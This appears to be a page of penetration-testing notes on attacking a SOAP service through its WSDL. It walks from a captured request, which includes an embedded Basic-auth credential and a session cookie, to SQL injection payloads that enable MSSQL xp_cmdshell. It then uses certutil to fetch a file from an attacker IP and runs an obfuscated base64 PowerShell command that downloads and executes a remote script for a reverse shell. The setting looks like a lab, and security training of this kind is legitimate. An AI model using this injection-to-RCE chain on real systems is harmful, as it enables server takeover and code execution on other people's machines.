---
description: Web Service Description file
---

# WSDL

<details>

<summary>Exploiting WSDL</summary>

Retrieving WSDL file: `GET /DocumentsService.asmx?wsdl`

<figure><img src=".gitbook/assets/image (344).png" alt=""><figcaption></figcaption></figure>

Right click: Extensions --> wsdler --> Parse WSDL

<figure><img src=".gitbook/assets/image (345).png" alt=""><figcaption></figcaption></figure>

In Wsdler tab --> select getDocumets\_Dev (Binding: DocumentsServiceSoap12)

<figure><img src=".gitbook/assets/image (346).png" alt=""><figcaption></figcaption></figure>

Save the following request as soap3.req

```
	POST /DocumentsService.asmx HTTP/1.1
	User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
	Accept: application/xml, text/xml, */*; q=0.01
	Accept-Language: en-US,en;q=0.5
	Accept-Encoding: gzip, deflate, br
	X-Requested-With: XMLHttpRequest
	Origin: http://172.16.1.24
	Authorization: Basic c3ZjX2lpczpWaW50YWdlIQ==
	Connection: keep-alive
	Referer: http://172.16.1.24/dashboard
	Cookie: ASP.NET_SessionId=2wx1ig0vwv55iwv3c3dutqp1
	Priority: u=0
	SOAPAction: http://tempuri.org/getDocuments_Dev
	Content-Type: text/xml;charset=UTF-8
	Host: 172.16.1.24
	Content-Length: 379
	
	<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope" xmlns:tem="http://tempuri.org/">
	   <soap:Header/>
	   <soap:Body>
	      <tem:getDocuments_Dev>
	         <!--type: string-->
	         <tem:document>gero et</tem:document>
	         <!--type: string-->
	         <tem:author>sonoras imperio</tem:author>
	      </tem:getDocuments_Dev>
	   </soap:Body>
	</soap:Envelope>

```

Have to enable xp\_cmdshell:

```sql
');EXEC sp_configure 'show advanced options', 1;--+
');RECONFIGURE;--+
');sp_configure;--+
');EXEC sp_configure 'xp_cmdshell', 1;--+
');RECONFIGURE;--+
```

<figure><img src=".gitbook/assets/image (347).png" alt=""><figcaption></figcaption></figure>

Testing to see if xp\_cmdshell works:

```sql
');EXEC xp_cmdshell 'cmd /c certutil -urlcache -f http://10.10.14.2/helloo hello';--+
```

<figure><img src=".gitbook/assets/image (348).png" alt=""><figcaption></figcaption></figure>

<figure><img src=".gitbook/assets/image (349).png" alt=""><figcaption></figcaption></figure>

Getting RCE on MSSQL, using simple\_ps\_revshell:

```sql
');EXEC xp_cmdshell 'cmd /c powershell -e SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA0AC4AMgAvAHIAdQBuAGEAbABsAC4AcABzADEAJwApAA==';--+
```

<figure><img src=".gitbook/assets/image (350).png" alt=""><figcaption></figcaption></figure>

</details>

<details>

<summary>References</summary>

[https://www.netspi.com/blog/technical-blog/web-application-pentesting/hacking-web-services-with-burp/](https://www.netspi.com/blog/technical-blog/web-application-pentesting/hacking-web-services-with-burp/)

</details>
